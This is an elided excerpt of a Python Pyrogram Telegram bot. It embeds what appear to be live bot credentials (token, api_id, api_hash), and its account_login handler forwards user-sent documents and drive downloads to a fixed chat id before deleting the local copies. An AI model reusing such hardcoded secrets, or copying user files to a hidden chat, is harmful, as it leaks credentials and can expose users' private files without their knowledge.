...
bot = Client("bot",
             bot_token= "7117502279:AAHk5S387m1mTl4DLcUEekGTciYCN7GLbrU",
             api_id= 26484988,
             api_hash= "8d6e625fe3e296b4b6bd4817aca39ec5")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002071942759, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002071942759)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
